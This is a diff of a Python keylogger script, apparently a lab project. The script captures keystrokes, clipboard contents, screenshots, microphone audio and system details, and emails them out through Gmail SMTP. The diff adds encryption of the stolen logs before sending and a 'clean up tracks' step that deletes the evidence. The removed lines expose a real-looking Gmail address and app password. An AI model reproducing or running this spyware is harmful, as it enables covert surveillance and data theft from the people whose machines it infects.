@@ -27,14 +27,22 @@ audio_info = "audio.wav"
 screenshot_info = "screenshot.png"
 microphone_time = 10
 time_iteration = 15
-email_address = "project5testmail123@gmail.com"
-password = "zrgu cujr tajp idvs "
-toaddr = "project5testmail123@gmail.com"
-file_path = "C:\\Users\\sltec\\Documents\\Personal Projects\\LAB5\\keylogger"
+email_address = "testmail@gmail.com"
+password = "App password"
+toaddr = "testmail@gmail.com"
+
+key = "encryption_key"
+
+file_path = "path to folder"
 extend = "\\"
 
+keys_info_e = "e_keys_info.txt"
+system_info_e = "e_system_info.txt"
+clipboard_info_e = "e_clipboard.txt"
 
-## Email ###############
+username = getpass.getuser()
+
+# email controls
 def send_email(filename, attachment, toaddr):
      fromaddr = email_address
      msg = MIMEMultipart()
@@ -62,8 +70,9 @@ def send_email(filename, attachment, toaddr):
      except Exception as e:
         print(f"Failed to send email: {e}")
 
-send_email(keys_info, file_path + extend + keys_info, toaddr)
+#send_email(keys_info, file_path + extend + keys_info, toaddr)
 
+# get computer information
 def computer_information():
      with open(file_path + extend + system_info, "a") as f:
           hostname = socket.gethostname()
@@ -78,7 +87,7 @@ def computer_information():
           f.write("Machine: " + platform.machine() + '\n')
           f.write("Hostname: " + hostname + '\n')
           f.write("Private IP Address: " + IPAddr + '\n')
-
+#  get clipboard information
 def copy_clipboard():
      with open(file_path + extend + clipboard_info, "a") as f:
           try:
@@ -89,6 +98,7 @@ def copy_clipboard():
           except:
                f.write("Clipboard cannot be copied")
 
+# microphone audio record
 def microphone():
      fs = 44100
      seconds = microphone_time
@@ -97,6 +107,7 @@ def microphone():
 
      write(file_path + extend + audio_info, fs, myrecording)
 
+# take a screenshot
 def screenshot():
      im = ImageGrab.grab()
      im.save(file_path + extend + screenshot_info)
@@ -106,6 +117,8 @@ current_time = time.time()
 stopping_time = time.time() + time_iteration
 number_of_iterations_end = 3
 
+
+# timer for keylogger
 while number_of_iterations < number_of_iterations_end:
 
      count = 0
@@ -149,8 +162,39 @@ while number_of_iterations < number_of_iterations_end:
           screenshot()
           send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)
           copy_clipboard()
-          send_email(clipboard_info, file_path + extend + clipboard_info, toaddr)
+          #send_email(clipboard_info, file_path + extend + clipboard_info, toaddr)
           microphone()
           send_email(audio_info, file_path + extend + audio_info, toaddr)
           computer_information()
-          send_email(system_info, file_path + extend + system_info, toaddr)
+          #send_email(system_info, file_path + extend + system_info, toaddr)
+          number_of_iterations += 1
+          current_time = time.time()
+          stopping_time = time.time() + time_iteration
+
+# encrypt the files
+files_to_encrypt = [
+     file_path + extend + keys_info,
+     file_path + extend + system_info,
+     file_path + extend + clipboard_info
+]
+encrypted_files = [
+     file_path + extend + keys_info_e,
+     file_path + extend + system_info_e,
+     file_path + extend + clipboard_info_e
+]
+for encrypting_file in encrypted_files:
+     with open(files_to_encrypt[count], 'rb') as f:
+          data = f.read()
+     fernet = Fernet(key)
+     encrypted = fernet.encrypt(data)
+     with open(encrypted_files[count], 'wb') as f:
+          f.write(encrypted)
+     send_email(encrypted_files[count], encrypted_files[count], toaddr)
+     count += 1
+     time.sleep(120)
+
+# clean up tracks and delete files
+delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
+for file in delete_files:
+     os.remove(file_path + extend + file)
+
